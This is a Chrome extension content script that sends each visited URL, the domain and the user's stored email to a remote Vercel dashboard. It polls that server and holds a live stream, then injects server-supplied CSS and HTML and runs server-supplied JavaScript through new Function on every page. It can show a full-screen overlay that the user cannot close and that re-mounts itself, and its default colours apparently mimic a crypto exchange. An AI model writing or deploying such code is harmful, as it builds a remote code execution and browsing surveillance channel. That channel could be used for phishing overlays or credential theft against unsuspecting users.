(function () {
  "use strict";

  // Prevent duplicate execution on the same document
  if (window.__remoteOverlayInitialized) return;
  window.__remoteOverlayInitialized = true;

  const currentDomain = window.location.hostname;
  const currentUrl = window.location.href;

  const DEFAULT_API_URL = "https://extension-dashboard-eight.vercel.app";
  const CANDIDATE_API_URLS = [
    "https://extension-dashboard-eight.vercel.app",
    "http://localhost:3001",
    "http://localhost:3000",
  ];

  let activeConfig = null;
  let activeEventSource = null;
  let pollIntervalId = null;
  let lastConfigHash = "";

  // 1. Get stored client credentials (NO overlay caching stored)
  async function getStoredSettings() {
    return new Promise((resolve) => {
      chrome.storage.local.get(["apiBaseUrl", "clientId", "userEmail"], (res) => {
        let clientId = res.clientId;
        if (!clientId) {
          clientId = "client_" + Math.random().toString(36).substring(2, 10);
          chrome.storage.local.set({ clientId });
        }
        resolve({
          apiBaseUrl: (res.apiBaseUrl || DEFAULT_API_URL).replace(/\/+$/, ""),
          clientId: clientId,
          userEmail: res.userEmail || "",
          isDefaultUrl: !res.apiBaseUrl,
        });
      });
    });
  }

  // 2. Client Heartbeat
  async function sendHeartbeat(apiUrl, clientId, userEmail) {
    try {
      await fetch(`${apiUrl}/api/client/heartbeat`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        cache: "no-store",
        body: JSON.stringify({
          clientId,
          email: userEmail,
          domain: currentDomain,
          currentUrl: currentUrl,
        }),
      });
    } catch (e) {
      // Heartbeat silent
    }
  }

  // 3. Dynamic CSS injection
  function applyCustomCss(css) {
    document.getElementById("custom-remote-overlay-css")?.remove();
    if (!css || !css.trim()) return;

    try {
      const styleEl = document.createElement("style");
      styleEl.id = "custom-remote-overlay-css";
      styleEl.textContent = css;
      (document.head || document.documentElement).appendChild(styleEl);
    } catch (e) {
      console.warn("[RemoteOverlay] Failed to inject custom CSS", e);
    }
  }

  // 4. Custom JS Execution
  function executeCustomJs(jsCode, cfg, popupEl) {
    if (!jsCode || !jsCode.trim()) return;

    try {
      const fn = new Function("context", `
        try {
          ${jsCode}
        } catch (err) {
          console.error("[RemoteOverlay Custom JS Error]:", err);
        }
      `);

      fn({
        domain: currentDomain,
        url: currentUrl,
        config: cfg,
        popup: popupEl,
        close: () => {
          popupEl.remove();
          activeConfig = null;
        },
      });
    } catch (e) {
      console.error("[RemoteOverlay] Failed to compile custom JS", e);
    }
  }

  // 5. Apply Overlay to DOM (NO fallback - strictly live data)
  function applyOverlay(cfg) {
    // If null or explicitly disabled, remove popup
    if (!cfg || cfg.enabled === false) {
      document.getElementById("custom-sticky-popup")?.remove();
      document.getElementById("custom-remote-overlay-css")?.remove();
      activeConfig = null;
      lastConfigHash = "";
      return;
    }

    activeConfig = cfg;

    // Apply custom CSS if provided
    if (cfg.customCss) {
      applyCustomCss(cfg.customCss);
    }

    // Remove existing popup if already rendered to update in-place
    document.getElementById("custom-sticky-popup")?.remove();

    const popup = document.createElement("div");
    popup.id = "custom-sticky-popup";

    const heightVal = cfg.height ? `${cfg.height}vh` : "50vh";

    Object.assign(popup.style, {
      position: "fixed",
      top: "0",
      left: "0",
      width: "100%",
      height: heightVal,
      background: cfg.bg || "#0b0e11",
      borderBottom: "2px solid #333",
      color: cfg.text || "#eaecef",
      fontFamily: "Arial, sans-serif",
      display: "flex",
      flexDirection: "column",
      justifyContent: "center",
      alignItems: "center",
      boxShadow: "0 6px 25px rgba(0,0,0,0.4)",
      boxSizing: "border-box",
      padding: "20px 40px",
    });

    popup.style.setProperty("z-index", "2147483647", "important");

    // Close button
    if (cfg.closable !== false) {
      const closeBtn = document.createElement("div");
      closeBtn.innerHTML = "&#x2715;";
      Object.assign(closeBtn.style, {
        position: "absolute",
        top: "20px",
        right: "30px",
        cursor: "pointer",
        fontSize: "24px",
        color: cfg.text || "#eaecef",
        opacity: "0.7",
        lineHeight: "1",
        userSelect: "none",
        transition: "opacity 0.2s",
      });
      closeBtn.onmouseover = () => (closeBtn.style.opacity = "1");
      closeBtn.onmouseout = () => (closeBtn.style.opacity = "0.7");
      closeBtn.onclick = () => {
        popup.remove();
        activeConfig = null;
      };
      popup.appendChild(closeBtn);
    }

    // Title
    if (cfg.title) {
      const title = document.createElement("div");
      title.innerText = cfg.title;
      Object.assign(title.style, {
        fontSize: "44px",
        fontWeight: "bold",
        color: cfg.titleColor || "#f0b90b",
        marginBottom: "20px",
        textAlign: "center",
        lineHeight: "1.2",
      });
      popup.appendChild(title);
    }

    // Message
    if (cfg.message) {
      const message = document.createElement("div");
      message.innerHTML = cfg.message;
      Object.assign(message.style, {
        fontSize: "22px",
        lineHeight: "1.6",
        textAlign: "center",
        maxWidth: "800px",
      });
      popup.appendChild(message);
    }

    // Safely mount to DOM
    function mount() {
      if (!document.getElementById("custom-sticky-popup")) {
        const parent = document.body || document.documentElement;
        if (parent) {
          parent.appendChild(popup);
        }
      }
    }

    if (document.body || document.documentElement) {
      mount();
    } else {
      document.addEventListener("DOMContentLoaded", mount);
    }

    // Execute custom JS if provided
    if (cfg.customJs) {
      executeCustomJs(cfg.customJs, cfg, popup);
    }
  }

  // 6. Direct zero-cache Live Fetch
  async function fetchLiveOverlay(apiUrl, clientId) {
    const cacheBuster = Date.now();
    const url = `${apiUrl}/api/overlay?domain=${encodeURIComponent(currentDomain)}&clientId=${encodeURIComponent(clientId)}&_t=${cacheBuster}`;

    const res = await fetch(url, {
      method: "GET",
      headers: {
        "Accept": "application/json",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
      },
      cache: "no-store",
    });

    if (!res.ok) {
      throw new Error(`API returned HTTP ${res.status}`);
    }

    return await res.json();
  }

  // Handle incoming live payload
  function handleLivePayload(data) {
    if (!data) return;

    if (data.matched && data.overlay) {
      const isEnabled = data.rule ? data.rule.enabled !== false : (data.overlay.enabled !== false);
      if (isEnabled) {
        const payloadStr = JSON.stringify(data.overlay);
        if (payloadStr !== lastConfigHash) {
          lastConfigHash = payloadStr;
          applyOverlay({
            ...data.overlay,
            enabled: true,
          });
        }
      } else {
        lastConfigHash = "disabled";
        applyOverlay(null);
      }
    } else {
      lastConfigHash = "unmatched";
      applyOverlay(null);
    }
  }

  // 7. Setup Live Connection (Server-Sent Events)
  async function setupLiveConnection() {
    const { apiBaseUrl, clientId, userEmail } = await getStoredSettings();

    // Send immediate heartbeat
    sendHeartbeat(apiBaseUrl, clientId, userEmail);

    // Initial instant live fetch (0 cache, no fallback)
    try {
      const data = await fetchLiveOverlay(apiBaseUrl, clientId);
      handleLivePayload(data);
    } catch (e) {
      // No fallback — do nothing if server unreachable
    }

    // Close any previous stream
    if (activeEventSource) {
      activeEventSource.close();
      activeEventSource = null;
    }

    // Connect to live SSE stream
    try {
      const streamUrl = `${apiBaseUrl}/api/overlay/live?domain=${encodeURIComponent(currentDomain)}&clientId=${encodeURIComponent(clientId)}&_t=${Date.now()}`;
      activeEventSource = new EventSource(streamUrl);

      activeEventSource.onmessage = (event) => {
        try {
          const liveData = JSON.parse(event.data);
          handleLivePayload(liveData);
        } catch (err) {
          console.warn("[RemoteOverlay SSE] Parse error:", err);
        }
      };

      activeEventSource.onerror = () => {
        // SSE will automatically attempt reconnect; fast polling ensures seamless continuity
      };
    } catch (e) {
      console.warn("[RemoteOverlay] SSE not available, using fast live polling.", e);
    }

    // 8. Continuous Live Poll (Every 3 seconds with zero cache)
    if (pollIntervalId) clearInterval(pollIntervalId);
    pollIntervalId = setInterval(async () => {
      try {
        const freshData = await fetchLiveOverlay(apiBaseUrl, clientId);
        handleLivePayload(freshData);
      } catch (err) {
        // No fallback
      }
    }, 3000);
  }

  // Ensure popup stays mounted if SPA re-renders body
  setInterval(() => {
    if (activeConfig && activeConfig.enabled !== false) {
      if (!document.getElementById("custom-sticky-popup")) {
        applyOverlay(activeConfig);
      }
    }
  }, 1500);

  // Listen for refresh messages from background
  chrome.runtime.onMessage.addListener((message) => {
    if (message.action === "refresh_overlay" || message.action === "background_poll") {
      setupLiveConnection();
    }
  });

  // Start live connection
  setupLiveConnection();
})();
